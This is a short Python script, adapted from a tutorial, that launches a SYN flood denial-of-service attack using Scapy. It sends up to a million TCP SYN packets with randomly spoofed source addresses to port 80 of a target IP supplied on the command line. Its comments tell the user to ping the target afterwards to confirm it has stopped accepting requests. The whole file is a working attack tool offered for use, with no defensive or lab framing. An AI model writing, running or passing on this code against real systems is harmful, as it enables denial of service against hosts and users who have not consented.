#code from: https://www.techgeekbuzz.com/blog/how-to-make-a-syn-flooding-attack-in-python/
# modified by Chadwick
import sys
from scapy.all import IP, TCP, send, RandIP


#http port
target_port = 80

def send_syn_pkt(target_ip, sport, dport):
    s_addr = RandIP()   #random Ip address
    pkt = IP(src=s_addr, dst=target_ip)/ TCP(sport =sport, dport=dport, seq= 1505066, flags="S")
    send(pkt)

def syn_flood_attack(target_ip: str, pkt_cnt: int = 1000000):
    for _ in range(pkt_cnt+1):
        #type CTRL +C to stop the SYN pkt
        send_syn_pkt(target_ip, 1234 , target_port )

def main():
    if len(sys.argv) < 3:
            print('Usage: python3 SYN_flood.py <target IP> <number of packets>')
            exit(1)

    target_ip = str(sys.argv[1])
    pkt_cnt = int(sys.argv[2])

    syn_flood_attack(target_ip=target_ip, pkt_cnt=pkt_cnt)

#control-c to end attack
#ping server that you attacked to verify the server doesn't accept anymore requests
if __name__ == "__main__":
    main()